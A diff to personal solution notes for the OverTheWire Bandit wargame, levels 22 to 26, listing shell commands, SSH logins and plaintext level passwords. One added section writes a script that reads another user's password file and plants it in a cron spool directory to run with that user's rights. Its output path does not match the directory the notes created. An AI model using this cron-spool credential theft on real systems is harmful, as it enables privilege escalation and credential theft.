@@ -160,7 +160,7 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ssh -p 2220 bandit22@bandit.labs.overthewire.org
 password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 
-level 21->22
+level 22->23
 cd /etc/cron.d/
 cat cronjob_bandit23
 cat /usr/bin/cronjob_bandit23.sh
@@ -168,3 +168,33 @@ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ssh -p 2220 bandit23@bandit.labs.overthewire.org
 password:jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+level 23->24
+cd /etc/cron.d/
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+cd /tmp
+mkdir mansi
+cd mansi/
+touch a.txt
+touch a.sh
+vi a.sh
+"
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 >> /tmp/kongwenbin23/bandit24pass
+
+"
+chmod 777 a.sh
+chmod 777 a.txt
+cp a.sh /var/spool/bandit24
+ssh -p 2220 bandit24@bandit.labs.overthewire.org
+password:UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+level 24->25
+password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+level 25->26
+grep "bandit26" /etc/passwd
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
